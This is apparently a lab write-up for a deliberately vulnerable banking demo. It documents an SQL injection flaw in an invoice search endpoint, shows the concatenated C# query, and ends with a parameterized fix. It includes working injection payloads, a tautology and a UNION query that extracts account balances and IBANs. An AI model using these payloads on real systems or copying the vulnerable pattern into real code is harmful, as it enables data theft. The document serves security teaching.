# A1 — SQL Injection

| | |
|---|---|
| **OWASP** | A03:2021 – Injection |
| **MITRE ATT&CK** | T1190 – Exploit Public-Facing Application |
| **STRIDE** | Tampering (see `threat-models/transfer-flow.stride.md`, threat #12) |
| **Flag** | `Vuln:A1` (env `Vuln__A1=true`) — vuln/* branch only |

## The vulnerability

`GET /api/invoice/search?reference=…` in
[`InvoiceController`](../../services/account/Controllers/InvoiceController.cs) builds SQL by
string concatenation:

```csharp
var sql = $"SELECT * FROM Transactions WHERE Reference = '{reference}'";
results = await _context.Transactions.FromSqlRaw(sql).ToListAsync();
```

User input escapes the string literal and rewrites the query.

## Run the exploit

```bash
python attacks/A1/exploit.py
```

- Baseline search for a non-existent reference → `0` rows.
- Payload `' OR '1'='1' -- ` → **every** transaction across **all** accounts.

**UNION extension (exfiltrate other tables):** because the query returns `Transactions.*`,
a UNION whose columns line up can smuggle `Accounts.Balance` / `Accounts.IBAN` into, e.g.,
the `Amount` / `Description` columns:

```
reference = ' UNION SELECT Id, 0, 'X', Balance, 'EUR', IBAN, NULL, NULL, NULL, GETUTCDATE(), GETUTCDATE(), '', NULL FROM Accounts -- 
```

## Evidence

See [`evidence.txt`](evidence.txt).

## The fix (M4)

Parameterize — never concatenate. The hardened path uses `FromSqlInterpolated`
(parameters), and EF Core LINQ elsewhere (CLAUDE.md rule #5). Add a CodeQL/SAST gate that
fails on raw concatenated SQL. DoD check **T12** in the threat model.
